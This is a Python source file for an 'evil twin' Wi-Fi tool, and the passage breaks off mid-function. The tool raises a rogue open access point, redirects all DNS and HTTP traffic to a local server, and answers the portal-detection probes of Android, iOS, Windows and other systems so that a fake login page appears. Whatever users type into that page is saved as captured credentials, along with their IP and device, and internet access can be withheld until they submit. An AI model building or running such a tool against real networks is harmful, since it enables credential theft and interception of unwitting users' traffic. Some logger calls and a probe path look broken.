#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi4 AP Mode — Evil Twin / Captive Portal / DNS Logger
=======================================================
Creates a rogue Access Point with optional captive portal and DNS logging.
Requires: hostapd, dnsmasq, and optionally iptables for internet forwarding.
"""

import os
import sys
import signal
import subprocess
import threading
import time
import http.server
import socketserver
import urllib.parse
import json
import re
import shutil
from pathlib import Path
from datetime import datetime
from typing import Optional, List

# Import logger from oneshot if available, else use a simple fallback
try:
    from oneshot import RealtimeLogger
except ImportError:
    class RealtimeLogger:
        @staticmethod
        def info(msg): print(f"[*] {msg}")
        @staticmethod
        def warn(msg): print(f"[-] {msg}")
        @staticmethod
        def err(msg): print(f"[!] {msg}")
        @staticmethod
        def ok(msg): print(f"[+] {msg}")
        @staticmethod
        def step(msg): print(f"[*] {msg}")
        @staticmethod
        def cmd(msg): print(f"  > {msg}")
        @staticmethod
        def separator(): print("─" * 60)


# ──────────────────────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────────────────────
AP_SUBNET = "192.168.4"
AP_IP = f"{AP_SUBNET}.1"
AP_DHCP_START = f"{AP_SUBNET}.10"
AP_DHCP_END = f"{AP_SUBNET}.250"
AP_CHANNEL = "6"
AP_SSID = "FreeWiFi"
AP_INTERFACE = ""  # Set dynamically
HOSTAPD_CONF = "/tmp/wifi4_hostapd.conf"
DNSMASQ_CONF = "/tmp/wifi4_dnsmasq.conf"
DNS_LOG = "/tmp/wifi4_dns.log"
TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captive_portal", "templates")

# ── Session output folder (created at AP start) ───────────
SESSION_DIR = ""  # Set dynamically in CaptureTracker.init()
CAPTURED_LOG = ""  # Set dynamically


# ──────────────────────────────────────────────────────────────
# Capture Tracker — live stats + per-user data
# ──────────────────────────────────────────────────────────────
class CaptureTracker:
    """Tracks connected clients, captured data, and live stats."""

    _instance = None
    _lock = threading.Lock()

    def __init__(self):
        self.clients = {}       # ip -> {count, fields, first_seen, last_seen, user_agent}
        self.total_captures = 0
        self.dns_queries = 0
        self.session_dir = ""
        self.captured_log = ""
        self.dns_log = ""
        self._running = False
        self._start_time = None

    @classmethod
    def get_instance(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = cls()
            return cls._instance

    def init(self, ssid: str = "FreeWiFi"):
        """Create session folder and initialize tracking."""
        global SESSION_DIR, CAPTURED_LOG
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_ssid = ssid.replace(" ", "_").replace("/", "_")[:20]
        self.session_dir = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "captures", f"{safe_ssid}_{timestamp}"
        )
        os.makedirs(self.session_dir, exist_ok=True)
        self.captured_log = os.path.join(self.session_dir, "credentials.json")
        self.dns_log = os.path.join(self.session_dir, "dns_queries.log")
        CAPTURED_LOG = self.captured_log
        SESSION_DIR = self.session_dir
        self._start_time = datetime.now()
        self._running = True
        RealtimeLogger.ok(f"Session folder: {self.session_dir}")

    def record_capture(self, client_ip: str, user_agent: str, data: dict):
        """Record a captured form submission."""
        with self._lock:
            if client_ip not in self.clients:
                self.clients[client_ip] = {
                    "count": 0,
                    "fields": {},
                    "first_seen": datetime.now().strftime("%H:%M:%S"),
                    "last_seen": "",
                    "user_agent": user_agent[:60],
                    "data_history": []
                }
            entry = self.clients[client_ip]
            entry["count"] += 1
            entry["last_seen"] = datetime.now().strftime("%H:%M:%S")
            for k, v in data.items():
                if k not in entry["fields"]:
                    entry["fields"][k] = []
                entry["fields"][k].append(v)
            entry["data_history"].append(data)
            self.total_captures += 1

    def record_dns(self):
        """Record a DNS query."""
        self.dns_queries += 1

    def get_live_stats(self) -> str:
        """Return formatted live stats string."""
        with self._lock:
            elapsed = "?"
            if self._start_time:
                secs = int((datetime.now() - self._start_time).total_seconds())
                m, s = divmod(secs, 60)
                h, m = divmod(m, 60)
                elapsed = f"{h:02d}:{m:02d}:{s:02d}"

            lines = []
            lines.append("")
            lines.append("\033[1;36m╔══════════════════════════════════════════════════╗\033[0m")
            lines.append("\033[1;36m║\033[0m  \033[1;97m📡 LIVE DASHBOARD\033[0m                              \033[1;36m║\033[0m")
            lines.append("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
            lines.append(f"\033[1;36m║\033[0m  ⏱  Elapsed: \033[1;33m{elapsed}\033[0m" + " " * (30 - len(elapsed)) + "\033[1;36m║\033[0m")
            lines.append(f"\033[1;36m║\033[0m  👥 Unique clients: \033[1;32m{len(self.clients)}\033[0m" + " " * (26 - len(str(len(self.clients)))) + "\033[1;36m║\033[0m")
            lines.append(f"\033[1;36m║\033[0m  🎯 Total captures: \033[1;33m{self.total_captures}\033[0m" + " " * (25 - len(str(self.total_captures))) + "\033[1;36m║\033[0m")
            lines.append(f"\033[1;36m║\033[0m  🌐 DNS queries: \033[1;35m{self.dns_queries}\033[0m" + " " * (28 - len(str(self.dns_queries))) + "\033[1;36m║\033[0m")
            lines.append("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")

            if self.clients:
                lines.append("\033[1;36m║\033[0m  \033[1;97mPer-Client Details:\033[0m" + " " * 26 + "\033[1;36m║\033[0m")
                lines.append("\033[1;36m║\033[0m  " + "─" * 46 + "  \033[1;36m║\033[0m")
                for ip, info in self.clients.items():
                    lines.append(f"\033[1;36m║\033[0m  \033[1;33m{ip}\033[0m")
                    lines.append(f"\033[1;36m║\033[0m    Captures: \033[1;32m{info['count']}\033[0m | First: {info['first_seen']} | Last: {info['last_seen']}")
                    for field, values in info["fields"].items():
                        val_preview = values[-1][:30] if values[-1] else "(empty)"
                        lines.append(f"\033[1;36m║\033[0m    {field}: \033[1;97m{val_preview}\033[0m")
                    lines.append("\033[1;36m║\033[0m  " + "─" * 46 + "  \033[1;36m║\033[0m")
            else:
                lines.append("\033[1;36m║\033[0m  \033[90mWaiting for clients to connect...\033[0m" + " " * 8 + "\033[1;36m║\033[0m")

            lines.append("\033[1;36m╠══════════════════════════════════════════════════╣\033[0m")
            lines.append(f"\033[1;36m║\033[0m  💾 Data saved: \033[1;32m{self.session_dir}\033[0m"[:53] + "\033[1;36m║\033[0m")
            lines.append("\033[1;36m╚══════════════════════════════════════════════════╝\033[0m")
            lines.append("")
            return "\n".join(lines)

    def get_summary(self) -> str:
        """Return final summary for Ctrl+C."""
        with self._lock:
            lines = []
            lines.append("")
            lines.append("\033[1;33m╔══════════════════════════════════════════════════╗\033[0m")
            lines.append("\033[1;33m║\033[0m  \033[1;97m📊 SESSION SUMMARY\033[0m                              \033[1;33m║\033[0m")
            lines.append("\033[1;33m╠══════════════════════════════════════════════════╣\033[0m")
            lines.append(f"\033[1;33m║\033[0m  👥 Unique clients: \033[1;32m{len(self.clients)}\033[0m" + " " * (26 - len(str(len(self.clients)))) + "\033[1;33m║\033[0m")
            lines.append(f"\033[1;33m║\033[0m  🎯 Total captures: \033[1;33m{self.total_captures}\033[0m" + " " * (25 - len(str(self.total_captures))) + "\033[1;33m║\033[0m")
            lines.append(f"\033[1;33m║\033[0m  🌐 DNS queries: \033[1;35m{self.dns_queries}\033[0m" + " " * (28 - len(str(self.dns_queries))) + "\033[1;33m║\033[0m")
            lines.append("\033[1;33m╠══════════════════════════════════════════════════╣\033[0m")

            for ip, info in self.clients.items():
                lines.append(f"\033[1;33m║\033[0m  \033[1;33m{ip}\033[0m — \033[1;32m{info['count']} captures\033[0m (first: {info['first_seen']}, last: {info['last_seen']})")
                for field, values in info["fields"].items():
                    lines.append(f"\033[1;33m║\033[0m    {field}: \033[1;97m{values[-1][:50]}\033[0m")

            lines.append("\033[1;33m╠══════════════════════════════════════════════════╣\033[0m")
            lines.append(f"\033[1;33m║\033[0m  \033[1;32m💾 ALL DATA SAVED:\033[0m                               \033[1;33m║\033[0m")
            lines.append(f"\033[1;33m║\033[0m  \033[1;97m{self.session_dir}\033[0m"[:53] + "\033[1;33m║\033[0m")
            lines.append(f"\033[1;33m║\033[0m    credentials.json  — captured form data          \033[1;33m║\033[0m")
            lines.append(f"\033[1;33m║\033[0m    dns_queries.log   — DNS query log               \033[1;33m║\033[0m")
            lines.append("\033[1;33m╚══════════════════════════════════════════════════╝\033[0m")
            lines.append("")
            return "\n".join(lines)


# ──────────────────────────────────────────────────────────────
# AP Mode Check
# ──────────────────────────────────────────────────────────────
def check_ap_support(interface: str) -> bool:
    """Check if the interface supports AP (master) mode."""
    RealtimeLogger.step(f"Checking AP mode support for {interface}...")
    try:
        result = subprocess.run(
            ["iw", "list"],
            capture_output=True, text=True, timeout=10
        )
        output = result.stdout

        # Parse modes for the specific interface
        in_interface = False
        in_modes = False
        for line in output.splitlines():
            line_stripped = line.strip()
            if f"Interface {interface}" in line:
                in_interface = True
                continue
            if in_interface:
                if "Supported" in line_stripped and "interface" in line_stripped.lower():
                    in_modes = True
                    continue
                if in_modes:
                    if line_stripped.startswith("*"):
                        mode = line_stripped.replace("*", "").strip()
                        if mode == "AP":
                            RealtimeLogger.ok(f"{interface} supports AP mode")
                            return True
                    elif line_stripped == "" or line_stripped.startswith("Interface"):
                        break
        # Fallback: broad search
        if "AP" in output and "managed" in output:
            RealtimeLogger.ok(f"{interface} likely supports AP mode (fallback check)")
            return True
        RealtimeLogger.err(f"{interface} does NOT support AP mode")
        return False
    except Exception as e:
        RealtimeLogger.warn(f"Could not verify AP support: {e} — proceeding anyway")
        return True


def check_ap_dependencies() -> dict:
    """Check if hostapd and dnsmasq are installed. Returns status dict."""
    deps = {}
    for binary, name in [("hostapd", "hostapd"), ("dnsmasq", "dnsmasq")]:
        found = shutil.which(binary) is not None
        deps[name] = found
        if found:
            RealtimeLogger.ok(f"{name} found")
        else:
            RealtimeLogger.warn(f"{name} NOT found")
    return deps


# ──────────────────────────────────────────────────────────────
# Configuration Generators
# ──────────────────────────────────────────────────────────────
def generate_hostapd_conf(interface: str, ssid: str, channel: str = "6") -> str:
    """Generate hostapd configuration file."""
    conf = f"""# WiFi4 AP Mode — hostapd config
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
# WPA settings (uncomment to enable WPA2)
# wpa=2
# wpa_passphrase=yourpassword
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
"""
    path = HOSTAPD_CONF
    with open(path, "w") as f:
        f.write(conf)
    RealtimeLogger.info(f"hostapd config written to {path}")
    return path


def generate_dnsmasq_conf(interface: str, dns_only: bool = False) -> str:
    """Generate dnsmasq configuration for DHCP + DNS."""
    conf = f"""# WiFi4 AP Mode — dnsmasq config
interface={interface}
bind-interfaces
dhcp-range={AP_DHCP_START},{AP_DHCP_END},255.255.255.0,24h
dhcp-option=option:router,{AP_IP}
dhcp-option=option:dns-server,{AP_IP}
"""
    if dns_only:
        # DNS-only mode: log all DNS queries, redirect everything to local
        conf += f"""
# DNS-only logging mode
log-queries
log-facility={DNS_LOG}
# Redirect ALL domains to our AP IP for DNS logging
address=/#/{AP_IP}
"""
    else:
        # Captive portal mode: redirect all HTTP to our server
        conf += f"""
# Captive portal mode: redirect all DNS to AP IP
address=/#/{AP_IP}
log-queries
log-facility={DNS_LOG}
"""
    path = DNSMASQ_CONF
    with open(path, "w") as f:
        f.write(conf)
    RealtimeLogger.info(f"dnsmasq config written to {path}")
    return path


# ──────────────────────────────────────────────────────────────
# Captive Portal HTTP Server
# ──────────────────────────────────────────────────────────────
class CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler for the captive portal. Captures form submissions.

    Handles captive portal detection for:
      - Android 5-16 (generate_204 probes)
      - iOS / macOS (CNA / hotspot-detect)
      - Windows (NCSI / connecttest)
      - Chrome OS / Chromium
      - Linux NetworkManager
      - FireOS / Kindle
    """

    portal_html = ""
    success_html = ""
    capture_log = CAPTURED_LOG
    grant_internet_after_submit = False
    internet_before_form = False
    ap_interface = ""

    # ── Portal detection URL sets ──────────────────────────
    # Android 5-16: expects 302 redirect for these → triggers popup
    # Primary: connectivitycheck.gstatic.com/generate_204
    # Fallback: play.googleapis.com/generate_204
    ANDROID_PROBES = [
        "/generate_204",
        "/gen_204",
        "/curl.txt",
        "/success.txt",
        "/canonical.html",
    ]

    # iOS / macOS CNA: expects 200 with '<HTML><HEAD><TITLE>Success</TITLE>...'
    # We return 302 instead → iOS shows CNA popup
    IOS_PROBES = [
        "/hotspot-detect.html",
        "/library/test/success.html",
        "/success.txt",
    ]

    # Windows NCSI: expects 200 with 'Microsoft Connect Test'
    # Returning 302 triggers portal popup
    WINDOWS_PROBES = [
        "/connecttest.txt",
        "/ncsi.txt",
        "/redirect",
        "/connecttest",
        "/ncsi真实性",
    ]

    # Chrome OS / Chromium: expects 204 if no portal
    CHROME_PROBES = [
        "/gen_204",
        "/generate_204",
        "/curl.txt",
    ]

    # Firefox: expects 200 with '<HTML><HEAD><TITLE>Success</TITLE>...'
    # We return 302 → Firefox shows captive portal bar
    FIREFOX_PROBES = [
        "/canonical.html",
        "/success.txt",
        "/generate_204",
        "/gen_204",
    ]

    # FireOS / Kindle
    KINDLE_PROBES = [
        "/kindle-wifi/wifistub.html",
        "/kindle-wifi/",
    ]

    # Linux NetworkManager: nmcheck.gnome.org/check_network_status.txt
    NM_PROBES = [
        "/check_network_status.txt",
    ]

    def log_message(self, format, *args):
        """Override to use RealtimeLogger."""
        # Reduce noise — only log actual requests, not every single line
        msg = args[0] if args else ""
        if "/generate_204" not in msg and "/gen_204" not in msg:
            RealtimeLogger.info(f"HTTP {msg}")

    def do_GET(self):
        """Handle GET requests — detect captive portal probes and serve portal."""
        user_agent = self.headers.get("User-Agent", "")
        path = self.path.lower()
        client_ip = self.client_address[0]

        # ── Android 5-16 Detection ─────────────────────────
        # Android probes these URLs expecting 204 if no portal.
        # We return 302 redirect → Android shows captive portal popup.
        if any(path.endswith(p) or path == p for p in self.ANDROID_PROBES):
            RealtimeLogger.info(f"Android probe detected from {client_ip}: {self.path}")
            self._redirect_to_portal()
            return

        # ── iOS / macOS CNA Detection ──────────────────────
        # iOS probes /hotspot-detect.html expecting body '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>'
        # If we return that exact content → iOS thinks no portal needed.
        # We return 302 instead → iOS shows CNA popup.
        if any(p in path for p in self.IOS_PROBES):
            RealtimeLogger.info(f"iOS probe detected from {client_ip}: {self.path}")
            self._redirect_to_portal()
            return

        # ── Windows NCSI Detection ─────────────────────────
        # Windows probes connecttest.txt expecting 'Microsoft Connect Test'
        # Returning anything else (or redirect) triggers the portal popup.
        if any(p in path for p in self.WINDOWS_PROBES):
            RealtimeLogger.info(f"Windows probe detected from {client_ip}: {self.path}")
            self._redirect_to_portal()
            return

        # ── Kindle / FireOS Detection ──────────────────────
        if any(p in path for p in self.KINDLE_PROBES):
            RealtimeLogger.info(f"Kindle probe detected from {client_ip}: {self.path}")
            self._redirect_to_portal()
            return

        # ── Linux NetworkManager Detection ─────────────────
        if any(p in path for p in self.NM_PROBES):
            RealtimeLogger.info(f"Linux NM probe detected from {client_ip}: {self.path}")
            self._redirect_to_portal()
            return

        # ── Firefox Captive Portal Detection ───────────────
        # Firefox probes detectportal.firefox.com/canonical.html
        if any(p in path for p in self.FIREFOX_PROBES):
            RealtimeLogger.info(f"Firefox probe detected from {client_ip}: {self.path}")
            self._redirect_to_portal()
            return

        # ── Success / Connected pages ──────────────────────
        if path in ("/success", "/connected"):
            self._serve_success()
            return

        # ── Android portal page request (after popup opens browser)
        # Android opens a browser to the redirect URL.
        # If it comes to us on any path, serve the portal.
        if "android" in user_agent.lower():
            RealtimeLogger.info(f"Android browser from {client_ip} — serving portal")
            self._serve_portal()
            return

        # ── iOS CNA browser request (after popup opens) ─────
        if "cfnetwork" in user_agent.lower() or "captive" in user_agent.lower():
            RealtimeLogger.info(f"iOS CNA browser from {client_ip} — serving portal")
            self._serve_portal()
            return

        # ── Windows portal request (after popup opens) ──────
        if "microsoft" in user_agent.lower() or "msie" in user_agent.lower():
            RealtimeLogger.info(f"Windows browser from {client_ip} — serving portal")
            self._serve_portal()
            return

        # Track DNS (every request = DNS resolved to us)
        tracker = CaptureTracker.get_instance()
        tracker.record_dns()

        # ── Default: serve portal for ALL other requests ────
        # This is the core captive portal behavior — any HTTP request
        # that reaches us should show the login page.
        RealtimeLogger.info(f"Generic request from {client_ip}: {self.path}")
        self._serve_portal()

    def do_POST(self):
        """Handle captive portal form submission."""
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8", errors="replace")
        params = urllib.parse.parse_qs(post_data)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        captured = {
            "timestamp": timestamp,
            "source_ip": self.client_address[0],
            "user_agent": self.headers.get("User-Agent", "unknown"),
            "data": {}
        }

        RealtimeLogger.separator()
        RealtimeLogger.ok("🎯 CAPTURED CREDENTIAL SUBMISSION!")
        RealtimeLogger.info(f"  Source IP: {self.client_address[0]}")
        RealtimeLogger.info(f"  User-Agent: {self.headers.get('User-Agent', 'unknown')[:80]}")

        for key, values in params.items():
            value = values[0] if values else ""
            captured["data"][key] = value
            RealtimeLogger.data(f"  {key}", value)

        try:
            with open(self.capture_log, "a", encoding="utf-8") as f:
                f.write(json.dumps(captured, ensure_ascii=False) + "\n")
        except IOError:
            pass

        RealtimeLogger.ok(f"  Saved to {self.capture_log}")

        # Track capture in live dashboard
        tracker = CaptureTracker.get_instance()
        tracker.record_capture(self.client_address[0],
                               self.headers.get("User-Agent", "unknown"),
                               captured["data"])

        # Print live dashboard
        print(tracker.get_live_stats())

        # After form submission: grant internet if mode is 'block until submit'
        if self.grant_internet_after_submit and not self.internet_before_form:
            client_ip = self.client_address[0]
            RealtimeLogger.step(f"Form submitted! Granting internet access to {client_ip}...")
            try:
                subprocess.run([
                    "iptables", "-D", "FORWARD",
                    "-s", client_ip,
                    "-j", "DROP"
                ], capture_output=True, timeout=5)
                subprocess.run([
                    "iptables", "-I", "FORWARD",
                    "-s", client_ip,
                    "-j", "ACCEPT"
                ], capture_output=True, timeout=5)
                RealtimeLogger.ok(f"Internet access granted for {client_ip}")
                RealtimeLogger.info(f"  Client can now browse the internet!")
            except Exception as e:
                RealtimeLogger.warn(f"Failed to grant internet: {e}")

        self._serve_success()

    # ── Response helpers ─────────────────────────────────────
    def _redirect_to_portal(self):
        """302 redirect to our captive portal — triggers popup on all OS."""
        self.send_response(302)
        self.send_header("Location", f"http://{AP_IP}:8080/")
        self.send_header("Content-Type", "text/html")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.end_headers()
        self.wfile.write(
            b"<HTML><HEAD><TITLE>302 Found</TITLE></HEAD>"
            b"<BODY><A HREF=\"http://" + AP_IP.encode() + b":8080/\">Portal</A></BODY></HTML>"
        )

    def _serve_portal(self):
        """Serve the captive portal login page."""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        self.end_headers()
        self.wfile.write(self.portal_html.encode("utf-8"))

    def _serve_success(self):
        """Serve the success page."""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(self.success_html.encode("utf-8"))


class CaptivePortalServer:
    """Manages the captive portal HTTP server."""

    def __init__(self, port: int = 8080, portal_html: str = "", success_html: str = "",
                 grant_internet_after_submit: bool = False,
                 internet_before_form: bool = True,
                 ap_interface: str = ""):
        self.port = port
        self.portal_html = portal_html
        self.success_html = success_html
        self.grant_internet_after_submit = grant_internet_after_submit
        self.internet_before_form = internet_before_form
        self.ap_interface = ap_interface
        self.httpd = None
        self.thread = None

    def start(self):
        """Start the HTTP server in a background thread."""
        CaptivePortalHandler.portal_html = self.portal_html
        CaptivePortalHandler.success_html = self.success_html
        CaptivePortalHandler.capture_log = CAPTURED_LOG
        CaptivePortalHandler.grant_internet_after_submit = self.grant_internet_after_submit
        CaptivePortalHandler.internet_before_form = self.internet_before_form
        CaptivePortalHandler.ap_interface = self.ap_interface

        self.httpd = socketserver.TCPServer(("0.0.0.0", self.port), CaptivePortalHandler)
        self.httpd.allow_reuse_address = True
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        RealtimeLogger.ok(f"Captive portal HTTP server running on port {self.port}")

    def stop(self):
        """Stop the HTTP server."""
        if self.httpd:
            self.httpd.shutdown()
            RealtimeLogger.info("Captive portal HTTP server stopped")


# ──────────────────────────────────────────────────────────────
# DNS Logger (no HTML, pure DNS logging)
# ──────────────────────────────────────────────────────────────
class DNSLogger:
    """Monitors dnsmasq DNS log in real-time and displays captured queries."""

    def __init__(self, log_file: str = DNS_LOG):
        self.log_file = log_file
        self.running = False
        self.thread = None
        self._last_pos = 0

    def start(self):
        """Start monitoring DNS log."""
        self.running = True
        # Ensure log file exists
        Path(self.log_file).touch()
        self._last_pos = os.path.getsize(self.log_file)
        self.thread = threading.Thread(target=self._monitor, daemon=True)
        self.thread.start()
        RealtimeLogger.ok("DNS query logger started (monitoring dnsmasq log)")

    def stop(self):
        self.running = False

    def _monitor(self):
        """Continuously read new lines from the DNS log."""
        while self.running:
            try:
                if os.path.exists(self.log_file):
                    size = os.path.getsize(self.log_file)
                    if size > self._last_pos:
                        with open(self.log_file, "r", encoding="utf-8", errors="replace") as f:
                            f.seek(self._last_pos)
                            new_data = f.read()
                            self._last_pos = size
                            for line in new_data.strip().splitlines():
                                if line.strip():
                                    self._parse_dns_line(line)
            except Exception:
                pass
            time.sleep(0.5)

    def _parse_dns_line(self, line: str):
        """Parse and display a dnsmasq log line."""
        # dnsmasq log format: "Aug 31 12:00:00 hostapd[pid]: query[A] example.com from 192.168.4.10"
        RealtimeLogger.info(f"DNS Query: {line.strip()}")


# ──────────────────────────────────────────────────────────────
# Internet Forwarding (NAT)
# ──────────────────────────────────────────────────────────────
def setup_internet_forwarding(ap_interface: str, internet_interface: str = None) -> bool:
    """Enable IP forwarding and set up NAT via iptables for internet access."""
    RealtimeLogger.step("Setting up internet forwarding (NAT)...")

    # Auto-detect internet interface if not specified
    if not internet_interface:
        internet_interface = _detect_internet_interface()
        if not internet_interface:
            RealtimeLogger.err("Could not detect internet interface for forwarding")
            return False

    RealtimeLogger.info(f"Internet interface: {internet_interface}")
    RealtimeLogger.info(f"AP interface: {ap_interface}")

    try:
        # Enable IP forwarding
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True, timeout=5
        )

        # Flush existing iptables rules
        subprocess.run(["iptables", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-t", "mangle", "-F"], capture_output=True, timeout=5)

        # Allow DHCP and DNS (port 53) from AP subnet — essential for captive portal
        subprocess.run([
            "iptables", "-A", "INPUT",
            "-i", ap_interface,
            "-p", "udp", "--dport", "67:68",
            "-j", "ACCEPT"
        ], capture_output=True, timeout=5)

        subprocess.run([
            "iptables", "-A", "INPUT",
            "-i", ap_interface,
            "-p", "udp", "--dport", "53",
            "-j", "ACCEPT"
        ], capture_output=True, timeout=5)

        subprocess.run([
            "iptables", "-A", "INPUT",
            "-i", ap_interface,
            "-p", "tcp", "--dport", "53",
            "-j", "ACCEPT"
        ], capture_output=True, timeout=5)

        # Allow HTTP to our captive portal server (port 8080)
        subprocess.run([
            "iptables", "-A", "INPUT",
            "-i", ap_interface,
            "-p", "tcp", "--dport", "8080",
            "-j", "ACCEPT"
        ], capture_output=True, timeout=5)

        # Redirect ALL HTTP (port 80) traffic to our captive portal server
        # This is the key rule — makes every HTTP request hit our portal
        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING",
            "-i", ap_interface,
            "-p", "tcp", "--dport", "80",
            "-j", "DNAT", "--to-destination", f"{AP_IP}:8080"
        ], capture_output=True, timeout=5)

        # Block all other forwarding (except DNS/DHCP which are handled above)
        # This forces devices into captive portal mode — they can't reach the internet
        subprocess.run([
            "iptables", "-A", "FORWARD",
            "-i", ap_interface,
            "-j", "DROP"
        ], capture_output=True, timeout=5)

        # NAT: masquerade traffic from AP subnet through internet interface
        subprocess.run([
            "iptables", "-t", "nat", "-A", "POSTROUTING",
            "-s", f"{AP_SUBNET}.0/24",
            "-o", internet_interface,
            "-j", "MASQUERADE"
        ], capture_output=True, timeout=5)

        RealtimeLogger.ok("Internet forwarding (NAT) configured")
        return True
    except Exception as e:
        RealtimeLogger.err(f"Failed to setup internet forwarding: {e}")
        return False


def cleanup_internet_forwarding():
    """Remove iptables rules and disable forwarding."""
    RealtimeLogger.step("Cleaning up internet forwarding...")
    try:
        subprocess.run(["iptables", "-F"], capture_output=True, timeout=5)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True, timeout=5)
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            capture_output=True, timeout=5
        )
        RealtimeLogger.ok("Internet forwarding cleaned up")
    except Exception:
        pass


def _detect_internet_interface() -> Optional[str]:
    """Detect the interface that has internet connectivity."""
    try:
        # Try to find the default route interface
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if "dev" in line:
                parts = line.split()
                idx = parts.index("dev")
                if idx + 1 < len(parts):
                    iface = parts[idx + 1]
                    if iface != AP_INTERFACE:
                        return iface
    except Exception:
        pass

    # Fallback: try common interfaces
    for iface in ["eth0", "wlan0", "enp0s3", "wlp2s0"]:
        if iface != AP_INTERFACE and os.path.exists(f"/sys/class/net/{iface}"):
            return iface
    return None


# ──────────────────────────────────────────────────────────────
# Process Management
# ──────────────────────────────────────────────────────────────
class APManager:
    """Manages hostapd, dnsmasq, and the captive portal server."""

    def __init__(self, interface: str, ssid: str = AP_SSID, channel: str = AP_CHANNEL):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.portal_server = None
        self.dns_logger = None
        self._running = False
        self._start_time = None

    def start(self, dns_only: bool = False, portal_html: str = "",
              success_html: str = "", enable_internet: bool = False,
              internet_iface: str = None) -> bool:
        """Start the AP with all components."""
        self._start_time = datetime.now()
        global AP_INTERFACE
        AP_INTERFACE = self.interface

        RealtimeLogger.separator()
        RealtimeLogger.banner("WiFi4 AP MODE")
        RealtimeLogger.separator()

        # Check dependencies
        deps = check_ap_dependencies()
        if not deps.get("hostapd"):
            RealtimeLogger.err("hostapd is required for AP mode. Install it:")
            RealtimeLogger.info("  Debian/Ubuntu: sudo apt install hostapd")
            RealtimeLogger.info("  Arch: sudo pacman -S hostapd")
            RealtimeLogger.info("  Fedora: sudo dnf install hostapd")
            RealtimeLogger.info("  Alpine: sudo apk add hostapd")
            return False
        if not deps.get("dnsmasq"):
            RealtimeLogger.err("dnsmasq is required for AP mode. Install it:")
            RealtimeLogger.info("  Debian/Ubuntu: sudo apt install dnsmasq")
            RealtimeLogger.info("  Arch: sudo pacman -S dnsmasq")
            RealtimeLogger.info("  Fedora: sudo dnf install dnsmasq")
            RealtimeLogger.info("  Alpine: sudo apk add dnsmasq")
            return False

        # Set up interface
        RealtimeLogger.step(f"Configuring interface {self.interface}...")
        self._setup_interface()

        # Configure hostapd
        RealtimeLogger.step(f"Starting Access Point: {self.ssid}")
        generate_hostapd_conf(self.interface, self.ssid, self.channel)

        # Start hostapd
        try:
            self.hostapd_proc = subprocess.Popen(
                ["hostapd", HOSTAPD_CONF],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding="utf-8", errors="replace"
            )
            time.sleep(2)
            if self.hostapd_proc.poll() is not None:
                out = self.hostapd_proc.communicate()[0]
                RealtimeLogger.err(f"hostapd failed to start:")
                for line in out.splitlines()[:10]:
                    RealtimeLogger.stdout(line)
                return False
            RealtimeLogger.ok(f"hostapd started — SSID: {self.ssid}")
        except FileNotFoundError:
            RealtimeLogger.err("hostapd binary not found")
            return False

        # Assign IP to interface
        subprocess.run(["ip", "addr", "flush", "dev", self.interface],
                       capture_output=True, timeout=5)
        subprocess.run(["ip", "addr", "add", f"{AP_IP}/24", "dev", self.interface],
                       capture_output=True, timeout=5)
        subprocess.run(["ip", "link", "set", self.interface, "up"],
                       capture_output=True, timeout=5)
        RealtimeLogger.ok(f"Interface {self.interface} configured with IP {AP_IP}")

        # Start dnsmasq (DHCP + DNS)
        RealtimeLogger.step("Starting DHCP/DNS server...")
        generate_dnsmasq_conf(self.interface, dns_only)

        # Kill existing dnsmasq
        subprocess.run(["killall", "dnsmasq"], capture_output=True, timeout=5)
        time.sleep(0.5)

        try:
            self.dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding="utf-8", errors="replace"
            )
            time.sleep(1)
            if self.dnsmasq_proc.poll() is not None:
                out = self.dnsmasq_proc.communicate()[0]
                RealtimeLogger.err(f"dnsmasq failed:")
                for line in out.splitlines()[:5]:
                    RealtimeLogger.stdout(line)
                return False
            RealtimeLogger.ok("dnsmasq started (DHCP + DNS)")
        except FileNotFoundError:
            RealtimeLogger.err("dnsmasq binary not found")
            return False

        # Start DNS logger
        self.dns_logger = DNSLogger()
        self.dns_logger.start()

        # Internet forwarding (optional)
        if enable_internet:
            internet_ok = setup_internet_forwarding(self.interface, internet_iface)
            if internet_ok:
                # If internet_before_form is False, BLOCK all internet initially
                # (will be unblocked per-client after form submission)
                internet_before = getattr(self, '_internet_before_form', True)
                if not internet_before:
